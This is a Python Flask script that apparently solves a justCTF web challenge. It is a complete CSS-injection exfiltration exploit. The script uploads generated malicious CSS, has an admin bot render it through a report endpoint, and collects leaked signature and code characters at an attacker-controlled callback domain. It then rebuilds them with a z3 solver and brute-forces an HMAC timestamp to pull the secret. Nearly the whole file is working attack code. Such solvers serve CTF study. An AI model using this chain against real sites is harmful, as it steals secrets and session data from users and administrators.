from flask import Flask
import z3solver
import time
import requests
import os
import re
import sys
from rules import generate_css

SERVER = os.environ.get('CHALLENGE_BASEURL') or 'http://terjanq.cf:1337'
s = requests.Session()

app = Flask(__name__)

info = {
    'words': [],
}

def getTimestamp():
    return int(time.time()) 


last_timestamp = getTimestamp()

def try_hmac(solutions, timestamp):
    for d in [-3,-2,-1,0,-4,-5,1,2,3,4,5]:
        for solution in solutions:
            r = s.get(SERVER+'/api/secret', params={
                'user_id':1,
                'timestamp':timestamp+d,
                'sgn': solution
            })
            if 'justCTF' in r.text: 
                print(r.text)

@app.route('/')
def hello():
    return "Hello World!"


@app.route('/s/<word>')
def get_sgn(word):
    global last_timestamp
    if word == 'start':
        last_timestamp = getTimestamp()
        info['words'] = []
    elif word == 'end':
        s = sorted(list(dict.fromkeys(info['words'])))
        print(len(s),s)
        info['words'] = []
        sol = z3solver.solve(s, len(s[0]), 64)
        print(sol)
        print(last_timestamp)
        try_hmac(sol, last_timestamp)
    else:
        info['words'].append(word)
    print('TIME: %d' % (getTimestamp() - last_timestamp))
    return "GIF89a;"

@app.route('/c/<word>')
def get_code(word):
    global last_timestamp
    
    if word == 'start':
        last_timestamp = getTimestamp()
        info['words'] = []
    elif word == 'end':
        s = sorted(list(dict.fromkeys(info['words'])))
        print(len(s),s)
        info['words'] = []
        sol = z3solver.solve(s, len(s[0]), 9)
        print(sol)
    else:
        info['words'].append(word)
    print('TIME: %d' % (getTimestamp() - last_timestamp))
    return "GIF89a;"


DOMAIN = os.environ.get('SOLVER_DOMAIN')

def send_payload(what):
    
    if what == 'sgn':
        file = generate_css('.sgn','value',DOMAIN+'/s',3,'abcdef0123456789',6,1,28)
        timeout = 40
    elif what == 'num':
        file = generate_css('code','title',DOMAIN+'/c',2,'0123456789',8,1,4)
        timeout = 10
    else:
        raise BaseException('must be sng or num')

    open('%s.css' % what, "w").write(file)

    s.post(SERVER+'/login', data={'username':'terjanq', 'secret':'123'})
    r = s.post(SERVER+'/upload_css', files={'file': file})
    t = re.search('uploads/[a-f0-9]+.css', r.text)
    up_file = t.group(0)
    print("CSS File: %s" % up_file)

    r = s.get(SERVER+'/s3cr3t_r3p0rt', params={
            'token': os.environ.get('ADMIN_TOKEN'),
            'css_path': up_file,
            'timeout': timeout
        })
    print(r.text)

if __name__ == '__main__':
    WHAT = os.environ.get('SOLVER_WHAT') or 'num'
    send_payload(WHAT)
    app.run(host="0.0.0.0", port=8888)
